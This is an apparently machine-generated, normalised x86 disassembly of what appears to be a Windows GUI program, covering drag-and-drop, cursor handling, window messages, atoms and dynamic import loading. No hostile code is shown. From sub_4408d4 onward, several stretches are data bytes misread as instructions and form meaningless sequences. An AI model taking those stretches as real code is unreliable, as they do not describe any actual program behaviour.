je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_43dc84
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_43fa00
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_43f728
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_43df54
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_43d888
mov eax edi
call sub_43dc78
test eax eax
je r-xdata
mov eax edi
call sub_43dc84
mov esi eax
mov eax esi
call sub_43dba0
push eax
mov eax esi
call sub_43d6dc
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_43dc78
call sub_43dba0
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_43dba0
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_43dbc8
mov eax esi
call sub_43dba0
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43dbc8
mov eax edi
call sub_43dc84
call sub_43dc18
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_43d6dc
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43dbc8
mov eax edi
call sub_43dc78
call sub_43dc18
mov bl 0x1
jmp r-xdata
sub_43fb38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43deec
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_4156bc
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43e6e0
test eax eax
je r-xdata
push ebp
call sub_43f980
pop ecx
push ebp
call sub_43fa00
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_43f904
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_43fbc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_43d76c
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_43d76c
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_43f8b4
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_43f8b4
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_43fc50
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440028
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069f4
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43e6e0
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f684
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069f4
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e6e0
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_434c50
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44002f
lea eax [ ebp - 0x48 ]
call sub_403e9c
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43b8e8
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_43396c
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_435e00
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403e9c
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_43fb38
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43a418
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f738
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069f4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_43fbc0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43f738
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069f4
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e6e0
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43502c
jmp r-xdata
mov eax edi
call sub_4510ec
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e6e0
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434aac
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43510c
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403ef0
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f624
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4527ec
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43b8e8
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_4357a8
jmp r-xdata
sub_440038
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403470
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_4401ac
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_4400c8
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440184
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_44012c
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_44015c
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406ae0
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_440184
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4400f8
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_4401ac
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_440110
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_44012c
pop ebx
retn
mov eax ebx
call sub_44015c
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_440210
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440376
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_440494
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_440478
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_440478
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_440584
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403164
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403164
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403164
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403164
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403e9c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403e9c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44060c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440784
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408b70
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403ef0
mov eax [ rw-data ]
call sub_40435c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b70
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ef0
mov eax [ rw-data ]
call sub_40435c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40435c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416d2c
mov [ rw-data ] eax
call sub_440210
mov dl 0x1
mov eax [ r-xdata ]
call sub_440038
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4520c8
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4531ac
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_454d94
mov ecx r-xdata
mov edx sub_43221c
mov eax [ r-xdata ]
call sub_4164e0
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44078b
lea eax [ ebp - 0x10 ]
call sub_403e9c
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4407d6
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440837
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44083e
retn
mov eax rw-data
call sub_40cd4c
call sub_440584
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404918
mov eax rw-data
call sub_403e9c
mov eax rw-data
call sub_403e9c
sub_440840
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4408c6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4408cd
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_44060c
mov eax [ r-xdata ]
call sub_416354
mov eax [ r-xdata ]
call sub_4163f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
sub_4408d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ fs : eax + eax - 0x58 ] eax
or [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x9 ] dh
inc esp
add [ eax + 0x60004409 ] dl
add [ eax ] al
add ah al
push ebp
inc ecx
add [ eax ] ch
int3
sub_440a22
inc ecx
add [ eax + 0x7c004033 ] ah
lds eax [ ecx ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
dec esp
adc [ eax + eax - 0x60 ] al
jno r-xdata
inc esp
add ah ah
adc [ eax + eax - 0x18 ] al
adc al [ eax + eax + 0x8 ]
add [ eax ] dh
enter 0x41 0xbc
jo r-xdata
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
je r-xdata
adc eax [ eax + eax + 0x11 ]
push esp
inc ebx
jne r-xdata
inc esp
add [ eax ] cl
add [ eax ] cl
leave
inc ecx
add [ eax + 0x11 ] dh
inc esp
add [ eax ] bl
leave
inc ecx
add [ eax ] dl
0x41
dec eax
add [ ecx ] 0xb4
add [ ecx ] 0x68
js r-xdata
add al dl
je r-xdata
test al 0x33
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add al 0x87
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
add [ esp + eax * 4 + 0x41 ] al
add [ eax + 0x7a ] dh
inc ecx
add [ ebx + edi * 2 + 0x41 ] al
add [ eax - 0x6fffbe7c ] al
test [ ecx ] al
mov ah 0x82
inc ecx
add [ eax + 0x78 ] ch
add [ ebx + eax * 4 - 0x7c1fffbf ] ch
inc ecx
add ah ah
add [ ecx ] 0xffffffe8
add [ ecx ] 0xffffffbc
js r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
loopne r-xdata
add [ eax ] bl
xor [ eax ] eax
je r-xdata
inc ebx
jne r-xdata
push 0x4374726f
add [ eax + 0x4000417c ] ch
jle r-xdata
test al 0x7b
inc ecx
add ah bh
jpo r-xdata
add [ ecx + eax * 2 + 0x41849000 ] 0x0
add [ ebp + eax * 4 + 0x41 ] bl
add [ eax - 0x73ffbe7b ] bh
xchg [ ecx ] al
jl r-xdata
xor [ eax ] eax
add al 0x81
inc ecx
add [ eax - 0x27ffbe8f ] ah
jne r-xdata
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xb1c0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
or eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx + 0x300044 ] dh
add [ eax ] al
int3
inc ecx
inc esp
add ah al
adc al 0x44
add [ eax ] dh
enter 0x41 0xbc
jo r-xdata
inc eax
add [ esp + edx + 0x44 ] dh
dec esp
imul esi [ ebx + 0x74 ] 0xbc8c08b
inc esp
add [ edi ] al
add [ esi + ecx ] dh
inc esp
add [ eax + 0x40004419 ] dl
int3
add [ esi + ecx * 8 + 0x41 ] ah
dec esp
imul esi [ ebx + 0x74 ] r-xdata
mov esp 0x414c
add [ eax + 0x2c00417e ] bl
jg r-xdata
or eax 0x6f685354
jb r-xdata
inc ecx
inc ecx
add al cl
xchg [ ecx ] al
cmp al 0x87
inc ecx
add [ eax + 0x6c00441a ] bl
add [ ecx ] sub_417418
or [ edx - 0x7db7ffbf ] al
inc ecx
add [ edx + eax * 4 + 0x78680041 ] dh
push eax
pop ss
inc esp
add [ edx + ebx + 0xe0044 ] cl
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov esp 0x64004010
add [ eax ] al
add [ eax + edx + 0x780040 ] bh
add [ eax ] al
mov esp 0x7c004010
add [ eax ] al
add [ edx ] al
add dh ch
add [ eax ] cl
leave
inc ecx
or cl cl
jne r-xdata
inc ebx
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xc380000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx + 0xcd00044 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x43ffbbf4 ] ch
or al 0x44
add [ eax - 0x30000000 ] ah
or [ eax + eax + 0x28 ] al
int3
dec esp
inc ecx
add [ eax ] al
add al dl
add [ ecx ] sub_4181ec
in al 0x84
inc ecx
add [ ebx + eax * 4 ] dh
inc ecx
add ah dh
xchg [ ecx ] al
sub_440cb4
fcomp [ ecx ]
inc esp
add [ edx + ebx ] al
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx * 8 - 0x32efffbf ] dl
inc ecx
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
ror [ esp + eax * 2 ] 0x1
add [ edi ] al
or eax 0x73754354
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ce04
test bl bl
jle r-xdata
mov edx esi
call sub_4411d8
add [ eax + 0x7c0041cd ] ch
int 0x41
add [ ebp + ecx * 8 - 0x3333ffbf ] ch
inc ecx
add [ eax - 0x33 ] ah
inc ecx
add [ ebp + ecx * 8 + 0x13280041 ] dh
inc esp
add [ ebx + edx ] bh
inc esp
add [ eax + 0x13 ] dl
inc esp
add [ ebx + edx + 0x44 ] ah
add [ eax + 0x13 ] bh
inc esp
add [ ebx + edx + 0x13a00044 ] cl
inc esp
add [ ebx + edx + 0x13c80044 ] dh
inc esp
add ah bl
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
cmp [ esp + eax * 2 ] cl
add [ ecx + ecx + 0x30044 ] ah
or [ ecx + 0x63 ] al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
adc eax [ eax + eax - 0x10 ]
adc eax [ eax + eax - 0xc ]
adc eax [ eax + eax - 0x8 ]
adc eax [ eax + eax - 0x4 ]
adc eax [ eax + eax ]
adc al 0x44
add [ esp + edx ] al
inc esp
add [ eax ] cl
adc al 0x44
add [ esp + edx ] cl
inc esp
add [ eax ] dl
adc al 0x44
add [ esp + edx ] dl
inc esp
add [ eax ] bl
adc al 0x44
add [ esp + edx ] bl
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0xde85653
daa
cld
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
mov ah 0xcd
inc ecx
add [ eax ] ch
adc eax [ eax + eax + 0x3c ]
adc eax [ eax + eax + 0x50 ]
adc eax [ eax + eax + 0x64 ]
adc eax [ eax + eax + 0x78 ]
adc eax [ eax + eax - 0x74 ]
adc eax [ eax + eax - 0x60 ]
adc eax [ eax + eax - 0x4c ]
adc eax [ eax + eax - 0x38 ]
adc eax [ eax + eax - 0x24 ]
add [ eax - 0x33 ] cl
inc ecx
dec esp
imul esi [ ebx + 0x74 ] 0xd400000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1800440d ] bh
add [ eax ] al
add [ ebp + edx * 2 + 0x41 ] al
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al 0xcd
inc ecx
add [ eax ] dl
int 0x41
sub_440dc4
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ce04
test bl bl
jle r-xdata
mov edx esi
call sub_4411d8
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_440e34
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41c918
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_440edc
sub_440e68
push ebx
push esi
push edi
